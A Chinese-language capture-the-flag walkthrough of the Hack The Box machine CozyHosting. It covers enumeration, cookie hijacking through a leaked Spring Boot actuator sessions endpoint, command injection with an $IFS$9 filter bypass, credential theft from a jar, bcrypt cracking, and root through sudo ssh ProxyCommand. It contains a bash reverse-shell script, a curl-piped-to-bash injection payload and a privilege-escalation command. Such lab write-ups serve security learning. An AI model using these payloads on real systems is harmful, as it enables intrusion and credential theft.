​		目标站点的web服务使用的是spring-boot框架，可以考虑使用专属的字典来枚举web子目录。枚举的过程中会发现一个api端点，该端点泄露了sessions信息，在sessions中找到了其他用户的cookie，使用cookie伪装成该用户访问了/admin面板。在/admin面板上找到了一个命令注入的漏洞获取了初始立足点。api端点还泄露了目标站点的配置信息，在获取初始立足点后找到了站点的配置文件，从中获取了postgresql数据库的凭证，登录数据库后找到了一些用户密码的哈希，破解该哈希得到了一个明文密码。因为密码复用的情况，使用该密码成功登录了机器上的一个普通用户，然后该普通用户可以sudo执行ssh，利用这点可以提权



# 一、信息收集

## 探测开放端口

1. 全TCP端口扫描

   ```bash
   └─# nmap -p- -Pn 10.10.11.230 --min-rate 10000             
   Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-10 03:34 EDT
   Nmap scan report for 10.10.11.230
   Host is up (0.27s latency).
   Not shown: 65532 closed tcp ports (reset)
   PORT     STATE SERVICE
   22/tcp   open  ssh
   80/tcp   open  http
   8000/tcp open  http-alt           
   ```

2. 全UDP端口扫描

   ```
   └─# nmap -sU -p- -Pn 10.10.11.230 --min-rate 10000
   ```

3. 开放TCP端口详细信息探测

   ```
   └─# nmap -sV -sC -Pn -O -p22,80,8000 10.10.11.230 --min-rate 10000
   Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-10 03:39 EDT
   Nmap scan report for 10.10.11.230
   Host is up (0.27s latency).
   
   PORT     STATE SERVICE   VERSION
   22/tcp   open  ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey: 
   |   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
   |_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
   80/tcp   open  http      nginx 1.18.0 (Ubuntu)
   |_http-server-header: nginx/1.18.0 (Ubuntu)
   |_http-title: Did not follow redirect to http://cozyhosting.htb
   8000/tcp open  http-alt?
   Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
   Aggressive OS guesses: Linux 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 4.15 - 5.6 (93%), Linux 3.10 (92%), Linux 5.3 - 5.4 (92%), Linux 2.6.32 (92%)
   No exact OS matches for host (test conditions non-ideal).
   Network Distance: 2 hops
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
   
   OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 124.81 seconds
   ```



## 端口服务信息收集

1. TCP 22 SSH

   目标机器是Ubuntu Linux。ssh的攻击面不大。

   

2. TCP 80 HTTP

   web服务器是nginx 1.18.0，没有找到nginx 1.18.0有价值的exploit。

   在/etc/hosts中添加 10.10.10.230 cozyhosting.htb。

   

   对web服务进行指纹识别

   ```bash
   └─# whatweb http://cozyhosting.htb/                                               
   http://cozyhosting.htb/ [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Email[info@cozyhosting.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.230], Lightbox, Script, Title[Cozy Hosting - Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]
   ```



​		探测web服务，找到了一个/login的登录端点。简单的尝试一下admin:admin这样的若口令和sql注入，但都失败了。

​		暂时没有枚举到有用的web子目录。



3. TCP 8000

   这个端口上开启的服务没有找到相关有用的信息



## web服务详细枚举

1. 简单枚举了一下目标机器，唯一的攻击点就剩下了80上的web服务。

   ```
   └─# gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://cozyhosting.htb/ -t 50 --no-error --no-progress 
   ===============================================================
   Gobuster v3.5
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:                     http://cozyhosting.htb/
   [+] Method:                  GET
   [+] Threads:                 50
   [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
   [+] Negative Status codes:   404
   [+] User Agent:              gobuster/3.5
   [+] Timeout:                 10s
   ===============================================================
   2023/10/10 04:15:53 Starting gobuster in directory enumeration mode
   ===============================================================
   /admin                (Status: 401) [Size: 97]
   /logout               (Status: 204) [Size: 0]
   /login                (Status: 200) [Size: 4431]
   /error                (Status: 500) [Size: 73]
   /index                (Status: 200) [Size: 12706]
   /[                    (Status: 400) [Size: 435]
   /plain]               (Status: 400) [Size: 435]
   /]                    (Status: 400) [Size: 435]
   /quote]               (Status: 400) [Size: 435]
   /extension]           (Status: 400) [Size: 435]
   /[0-9]                (Status: 400) [Size: 435]
   /[0-1][0-9]           (Status: 400) [Size: 435]
   /20[0-9][0-9]         (Status: 400) [Size: 435]
   /[2]                  (Status: 400) [Size: 435]
   /index                (Status: 200) [Size: 12706]
   /actuator             (Status: 200) [Size: 634]
   /[2-9]                (Status: 400) [Size: 435]
   /options[]            (Status: 400) [Size: 435]
   ===============================================================
   2023/10/10 04:22:12 Finished
   ===============================================================
   ```

   

2. 发现一个/actuator的目录，访问发现它应该是一个API端点。

   ![image-20231010162550213](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202310101626751.png)

   ​	在/actuator/env下发现cloudhosting-0.0.1.jar文件中似乎有用户名和密码。后来得知spring.datasource.password是sprint-boot中设置数据库密码的一种方式

   ![image-20231010184054148](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202310101842740.png)

   ​	

   3. 尝试访问self、sessions、beans这些端点，在sessions下发现一些内容。从该api端点的命名来看，应该是会话信息

   ![image-20231010162708527](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202310101952461.png)

   4. 修改/login页面的cookie为/actuator/sessions下找到的cookie，成功通过劫持cookie伪装成了kanderson用户

      ![image-20231010163215689](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202310101632841.png)

5. /admin页面有一个submit按钮，

   ![image-20231010164437259](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231010164437259.png)

   在hostname处填写我们的ip，username随便，点击submit提交。从响应包的报错信息来看它尝试连接我们机器的22端口

   ![image-20231010164623575](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231010164623575.png)

   猜测这边后台执行了类似  ssh <username>@<host>的指令。对host参数尝试命令注入，构造ssh username@ip;command这样的语句。



4. host参数有过滤机制，我在测试过程中发现输入非字母字符会报错，二username参数不允许出现空格

   ![image-20231010172952323](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231010172952323.png)

      google找到了使用 $IFS$9 的替换空格的方式

   ![image-20231010173537265](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202310101735397.png)

      成功使用下列负载实现了命令注入

   host=127.0.0.1&username=id**;ping$IFS$9-c4$IFS$910.10.14.89;**

      

# 二、获取初始立足点

1. 创建一个rs.sh文件

   ```sh
   #/bin/bash
   bash -c "bash -i >& /dev/tcp/10.10.14.89/4444 0>&1"
   ```

2. 本地使用python开启http服务，然后让目标机器访问rs.sh并执行

   有效负载如下

   host=127.0.0.1&username=id;curl$IFS$9http://10.10.14.89/rs.sh|bash;



​		成功获取了初始立足点

​		![image-20231010174119553](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202310101741264.png)



3. 稳固shell

   ```
   python -c 'import pty;pty.spawn("/bin/bash")'，请根据需要替换python为python2或python3。
   export TERM=xterm
   Ctrl + Z 将 shell 置入后台。回到我们自己的终端，我们使用stty raw -echo; fg
   ```

   

# 三、特权升级

1. 使用linpeas.sh枚举一下目标机器

   发现本地8080口运行着一个java服务，本地的5432端口还运行着portgreSql服务

   ![image-20231010175357812](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202310101754694.png)

   8080上的服务和80口上的服务一致，没有探测的必要

   ![image-20231010180810369](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202310101808399.png)



2. 在/apt找到了可能包含有密码的cloudhosting-0.0.1.jar文件，直接检索password关键字没有找到有用的信息

   ![image-20231010181714148](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231010181714148.png)

   

3. google后得知jar是一种使用zip压缩算法的打包java文件的方式，使用zipgrep命令来检索压缩包中的password字符串。

   ```
   app@cozyhosting:/app$ zipgrep password cloudhosting-0.0.1.jar 
   grep: (standard input): binary file matches
   grep: (standard input): binary file matches
   grep: (standard input): binary file matches
   BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-fill:before { content: "\eecf"; }
   BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-line:before { content: "\eed0"; }
   BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-fill:before { content: "\eecf"; }
   BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-line:before { content: "\eed0"; }
   BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-fill"
   BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-line"
   grep: (standard input): binary file matches
   BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-fill">
   BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-line">
   grep: (standard input): binary file matches
   BOOT-INF/classes/templates/login.html:                                        <input type="password" name="password" class="form-control" id="yourPassword"
   BOOT-INF/classes/templates/login.html:                                        <div class="invalid-feedback">Please enter your password!</div>
   BOOT-INF/classes/templates/login.html:                                    <p th:if="${param.error}" class="text-center small">Invalid username or password</p>
   BOOT-INF/classes/application.properties:spring.datasource.password=Vg&nvzAQ7XxR
   grep: (standard input): binary file matches
   ```

   找到了一个数据库的密码 Vg&nvzAQ7XxR

   使用同样的方式得到了数据库的用户名是 postgres



4. 我们拥有了postgresql数据库的凭证 `postgres:Vg&nvzAQ7XxR` 可以使用psql来连接postgresql数据库

   ```bash
   psql -h localhost -p 5432 -U postgres -W 'Vg&nvzAQ7XxR'
   
   app@cozyhosting:/app$ psql -h localhost -p 5432 -U postgres
   Password for user postgres: 
   psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
   SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
   Type "help" for help.
   
   postgres=# 
   ```

   接下来根据hacktricks中的[postgresql-pentesting][https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql]的步骤进行测试

   ```
   \list  #列出数据库
                                      List of databases
       Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
   -------------+----------+----------+-------------+-------------+-----------------------
    cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
    postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
    template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
                |          |          |             |             | postgres=CTc/postgres
    template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
                |          |          |             |             | postgres=CTc/postgres
   (4 rows)
   
   \c cozyhosting # 使用数据库
   postgres=# \c cozyhosting
   SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
   You are now connected to database "cozyhosting" as user "postgres".
   
   \d # List tables
                 List of relations
    Schema |     Name     |   Type   |  Owner   
   --------+--------------+----------+----------
    public | hosts        | table    | postgres
    public | hosts_id_seq | sequence | postgres
    public | users        | table    | postgres
   (3 rows)
   
   select * from users; #检索users表里的数据
      name    |                           password                           | role  
   -----------+--------------------------------------------------------------+-------
    kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
    admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
   
   ```

   使用在线哈希识别工具识别出这个哈希是bcrypt Unix，对应的hashcat mode是3200

   ![image-20231010191433766](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202310101915042.png)

   使用hashcat破解密码哈希，得到admin用户的密码manchesterunited

   ```
   └─# hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
   $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
   ```

5. 考虑到密码复用的情况，使用 josh：manchesterunited凭证通过ssh链接上目标机器



6. 发现jsoh用户可以sudo执行ssh命令

   ![image-20231010192310001](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202310101923130.png)

   执行下列命令提权到root

   ```bash
   sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
   ```

   ![image-20231010192741423](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202310101927309.png)
